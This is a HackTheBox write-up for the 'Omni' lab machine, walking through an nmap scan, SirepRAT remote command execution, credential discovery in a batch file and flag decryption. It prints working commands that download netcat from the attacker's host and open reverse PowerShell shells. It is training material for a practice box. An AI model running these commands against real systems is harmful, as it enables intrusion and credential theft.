## Omni [HackTheBox]

> Mayank Srivastava | 5 jan 2021 1:48 PM

## Machine Introduction
```
Name       Omni   

Os Type    Other    

Diffculty  Easy

Points     30

Ip address 10.10.10.204 

```

As usual Basic enumeration

## Nmap Scanning

```
# Nmap 7.91 scan initiated Tue Jan  5 13:36:10 2021 as: nmap -Pn -sC -sV -oN nmap/initial 10.10.10.204
Nmap scan report for 10.10.10.204
Host is up (0.39s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE VERSION
135/tcp  open  msrpc   Microsoft Windows RPC
8080/tcp open  upnp    Microsoft IIS httpd
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Windows Device Portal
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesn't have a title.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jan  5 13:37:04 2021 -- 1 IP address (1 host up) scanned in 53.77 seconds

```
After gathering more information about the box i got at the conclusion that the box is a IOT based and to exploit it we can use SafeBreach-Lab's ```SirepRAT```.
SirepRAT has a functionality which lets us run Arbitrary Program. That means we could run cmd.exe and call in ``` powershell ``` and download a file via the ```Invoke-WebRequest``` cmdlet.

Use the Following command
```

python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c powershell Invoke-Webrequest -OutFile C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe -Uri http://10.10.14.50:8000/nc64.exe" --v


```

Now Execute Netcat on the attacker machine to get reverse connection

On attacker machine : ``` nc -nlvp 9999 ```

Run the Following command to get reverse connection from the victm Machine

```
python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe 10.10.14.50 9999 -e powershell.exe" --v
```

Now we have a poweshell reverse connection on our machine now lets execute the following command which will give us interesting credentials.

## Exploitation

```

$ cd “c:\ProgramFiles\WindowsPowershell\Modules\PackageManagement”

$ ls -force

```

As You can see there are two credentials in r.bat file so using this credentials we can login to the web application of the machine.

goto Processes > Run Command

Here We Could run commands. Lets try to get a reverse shell.

Start a another netcat listener on your machine again on different port, and then run this command.

```
C:\Windows\System32\spool\drivers\color\nc64.exe <Your_Ip address> 9999 -e powershell.exe
```

Now we will get reverse connection now lets check the username using following commands

```
$env:Username
```

We are logged in as ```app``` user it means we can read the user.txt file but content looks encrypted we need to decrypt it.

For decrypt the flag we need to execute some commands.

```
$credential = Import-CliXml -Path U:\Users\app\user.txt
$ $credential.GetNetworkCredential().Password
```
After Running this command user flag will apper on the konsole


## Post Exploitation

Remember we found two username in r.bat file?
Let's use the second one, The administrator.

Start another netcat listener

GoTo Processes > Run Command

Then again Run this command

```
C:\Windows\System32\spool\drivers\color\nc64.exe <Your_Ip_address> 5555 -e powershell.exe"
```

Now we have a reverse poweshell

same process as ```user.txt``` we can also decrypt ```root.txt```.

```
$ $credential = Import-CliXml -Path U:\Users\administrator\root.txt
$ $credential.GetNetworkCredential().Password
```

Yeahhhhhhhhhhhhh!!!!!!! We have root flag.
